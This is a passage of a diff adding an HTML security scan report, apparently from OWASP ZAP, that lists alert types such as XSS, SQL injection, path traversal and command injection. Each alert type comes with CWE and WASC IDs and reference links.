+								<td>8</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></li>
+										<li><a href="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-2">
+						<h4>External Redirect</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/20019/">External Redirect</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/601.html">601</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>38</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html</a></li>
+										<li><a href="https://cwe.mitre.org/data/definitions/601.html">https://cwe.mitre.org/data/definitions/601.html</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-3">
+						<h4>Path Traversal</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/6/">Path Traversal</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/22.html">22</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>33</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://owasp.org/www-community/attacks/Path_Traversal">https://owasp.org/www-community/attacks/Path_Traversal</a></li>
+										<li><a href="https://cwe.mitre.org/data/definitions/22.html">https://cwe.mitre.org/data/definitions/22.html</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-4">
+						<h4>Remote OS Command Injection</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/90020/">Remote OS Command Injection</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/78.html">78</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>31</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://cwe.mitre.org/data/definitions/78.html">https://cwe.mitre.org/data/definitions/78.html</a></li>
+										<li><a href="https://owasp.org/www-community/attacks/Command_Injection">https://owasp.org/www-community/attacks/Command_Injection</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-5">
+						<h4>SQL Injection</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/40018/">SQL Injection</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/89.html">89</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>19</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-6">
+						<h4>SQL Injection - MySQL</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/40018/">SQL Injection</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/89.html">89</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>19</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-7">
+						<h4>SQL Injection - Oracle - Time Based</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/40021/">SQL Injection - Oracle</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/89.html">89</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>19</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-8">
+						<h4>SQL Injection - SQLite</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/40024/">SQL Injection - SQLite</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/89.html">89</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>19</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-9">
+						<h4>Buffer Overflow</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/30001/">Buffer Overflow</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/120.html">120</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>7</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://owasp.org/www-community/attacks/Buffer_overflow_attack">https://owasp.org/www-community/attacks/Buffer_overflow_attack</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-10">
+						<h4>Directory Browsing</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/0/">Directory Browsing</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/548.html">548</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>48</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://httpd.apache.org/docs/mod/core.html#options">https://httpd.apache.org/docs/mod/core.html#options</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-11">
+						<h4>XSLT Injection</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/90017/">XSLT Injection</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/91.html">91</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>23</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://www.contextis.com/blog/xslt-server-side-injection-attacks">https://www.contextis.com/blog/xslt-server-side-injection-attacks</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+				</ol>
+			</section>
+		</section>
+		 
+	</main>
+
+
+
+
+
+</body></html>
